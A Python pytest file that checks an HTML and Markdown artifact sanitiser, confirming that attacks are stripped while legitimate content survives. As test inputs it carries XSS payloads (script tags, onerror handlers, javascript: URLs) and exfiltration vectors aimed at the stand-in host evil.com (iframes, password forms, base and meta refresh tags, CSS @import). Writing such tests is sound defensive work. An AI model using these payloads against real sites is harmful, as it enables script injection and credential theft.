"""Artifact sanitisation.

These are the security tests for the Artifact Viewer. Each case is a real XSS
or exfiltration vector, and the assertions check both halves of the contract:
the attack is neutralised **and** legitimate content survives. A sanitiser that
strips everything is safe and useless.
"""

from __future__ import annotations

import pytest

from app.skills.artifact_safety import (
    ARTIFACT_CSP,
    MAX_ARTIFACT_CHARS,
    extract_title,
    sanitise_css,
    sanitise_html_artifact,
    sanitise_markdown_artifact,
    SafetyReport,
)


class TestScriptRemoval:
    @pytest.mark.parametrize(
        "payload",
        [
            "<script>alert(1)</script>",
            "<script src='https://evil.com/x.js'></script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<script\n>alert(1)</script>",
        ],
    )
    def test_removes_script_tags(self, payload: str):
        document, report = sanitise_html_artifact(f"<html><body>{payload}<p>ok</p></body></html>")
        assert "<script" not in document.lower()
        assert "alert(1)" not in document
        assert report.sanitised is True

    @pytest.mark.parametrize(
        "payload",
        [
            '<img src=x onerror="alert(1)">',
            '<div onclick="steal()">x</div>',
            "<body onload=alert(1)>",
            '<p onmouseover="x()">hover</p>',
        ],
    )
    def test_removes_event_handlers(self, payload: str):
        document, _ = sanitise_html_artifact(payload)
        for handler in ["onerror", "onclick", "onload", "onmouseover"]:
            assert handler not in document.lower()

    @pytest.mark.parametrize(
        "payload",
        [
            '<a href="javascript:alert(1)">x</a>',
            "<a href='javascript:void(0)'>x</a>",
            '<a href="vbscript:msgbox(1)">x</a>',
        ],
    )
    def test_removes_scripting_urls(self, payload: str):
        document, _ = sanitise_html_artifact(payload)
        assert "javascript:" not in document.lower()
        assert "vbscript:" not in document.lower()


class TestEmbeddingAndExfiltration:
    def test_removes_nested_browsing_contexts(self):
        document, report = sanitise_html_artifact(
            "<iframe src='https://evil.com'></iframe>"
            "<object data='x.swf'></object>"
            "<embed src='y'>"
        )
        for tag in ["<iframe", "<object", "<embed"]:
            assert tag not in document.lower()
        assert report.blocked

    def test_removes_forms_and_credential_inputs(self):
        """A rendered form that looks real is a phishing surface."""
        document, _ = sanitise_html_artifact(
            '<form action="https://evil.com"><input type="password" name="pw"></form>'
        )
        assert "<form" not in document.lower()
        assert "<input" not in document.lower()

    def test_removes_base_meta_and_external_stylesheets(self):
        document, _ = sanitise_html_artifact(
            '<base href="https://evil.com/">'
            '<link rel="stylesheet" href="https://evil.com/x.css">'
            '<meta http-equiv="refresh" content="0;url=https://evil.com">'
        )
        assert "<base" not in document.lower()
        assert "evil.com" not in document
        # Our own CSP meta is injected by the builder, so one meta remains.
        assert ARTIFACT_CSP in document

    @pytest.mark.parametrize(
        "css",
        [
            "@import url(https://evil.com/x.css);",
            "body{background:url('https://evil.com/p.png')}",
            "body{background:url(//evil.com/p.png)}",
            "div{width:expression(alert(1))}",
            "a{behavior:url(#default#userData)}",
        ],
    )
    def test_removes_network_reaching_css(self, css: str):
        cleaned = sanitise_css(css, SafetyReport())
        assert "evil.com" not in cleaned
        assert "expression(" not in cleaned
        assert "@import" not in cleaned

    def test_data_uri_images_are_permitted(self):
        """Allowed deliberately: the only way an artifact can show an image."""
        cleaned = sanitise_css("body{background:url(data:image/png;base64,iVBOR)}", SafetyReport())
        assert "data:image/png" in cleaned


class TestLegitimateContentSurvives:
    def test_preserves_structure_styling_and_links(self):
        source = """<!DOCTYPE html><html><head><title>Growth Report</title>
        <style>body{color:#123456} .card{padding:12px}</style></head>
        <body><h1>Growth</h1><p style="color:blue">Text</p>
        <table><tr><td colspan="2">cell</td></tr></table>
        <a href="https://www.youtube.com/watch?v=abc">Episode</a>
        <ul><li>one</li></ul></body></html>"""

        document, report = sanitise_html_artifact(source)

        assert "<h1>Growth</h1>" in document
        assert "color:#123456" in document
        assert "color:blue" in document
        assert 'colspan="2"' in document
        assert "youtube.com/watch?v=abc" in document
        assert "<li>one</li>" in document
        assert report.blocked == {}, "clean input must not be reported as sanitised"

    def test_forces_safe_rel_on_links(self):
        document, _ = sanitise_html_artifact('<a href="https://example.com">x</a>')
        assert "noopener" in document
        assert "noreferrer" in document

    def test_keeps_inline_svg(self):
        document, _ = sanitise_html_artifact(
            '<svg viewBox="0 0 10 10"><circle cx="5" cy="5" r="4" fill="red"/></svg>'
        )
        assert "<svg" in document
        assert "<circle" in document


class TestDocumentShell:
    def test_injects_csp_and_owns_the_head(self):
        document, _ = sanitise_html_artifact("<p>hello</p>")
        assert ARTIFACT_CSP in document
        assert "default-src 'none'" in document
        assert document.strip().startswith("<!DOCTYPE html>")

    def test_extracts_title_from_document_then_heading(self):
        assert extract_title("<title>My Report</title>") == "My Report"
        assert extract_title("<h1>Fallback Heading</h1>") == "Fallback Heading"
        assert extract_title("<p>no title</p>", fallback="Untitled") == "Untitled"

    def test_escapes_the_title(self):
        document, _ = sanitise_html_artifact('<title>"><script>alert(1)</script></title><p>x</p>')
        assert "<script" not in document.lower()

    def test_strips_markdown_code_fences(self):
        """Models wrap HTML in ```html despite instructions."""
        document, _ = sanitise_html_artifact("```html\n<p>content</p>\n```")
        assert "```" not in document
        assert "<p>content</p>" in document

    def test_truncates_oversized_artifacts(self):
        document, report = sanitise_html_artifact("<p>x</p>" * (MAX_ARTIFACT_CHARS // 4))
        assert report.truncated is True
        assert len(document) < MAX_ARTIFACT_CHARS * 2

    def test_safety_report_documents_the_policy(self):
        """The UI renders this; it must state what is enforced."""
        _, report = sanitise_html_artifact("<script>x</script>")
        policy = report.as_dict()["policy"]
        assert policy["scripts_enabled"] is False
        assert policy["same_origin"] is False
        assert "allow-scripts" not in policy["iframe_sandbox"]
        assert "allow-same-origin" not in policy["iframe_sandbox"]


class TestMarkdownArtifacts:
    def test_strips_embedded_html_attacks(self):
        """Markdown permits raw HTML, so the same vectors apply."""
        cleaned, report = sanitise_markdown_artifact(
            "# Title\n\n<script>alert(1)</script>\n\nText <img src=x onerror=alert(2)>"
        )
        assert "<script" not in cleaned
        assert "onerror" not in cleaned
        assert report.sanitised is True

    def test_preserves_markdown_structure(self):
        source = "# Title\n\n## Section\n\n- bullet [S1]\n\n**bold** and `code`\n"
        cleaned, report = sanitise_markdown_artifact(source)
        assert "# Title" in cleaned
        assert "- bullet [S1]" in cleaned
        assert "**bold**" in cleaned
        assert report.blocked == {}

    def test_strips_wrapping_code_fence(self):
        cleaned, _ = sanitise_markdown_artifact("```markdown\n# Real Title\n```")
        assert cleaned.startswith("# Real Title")
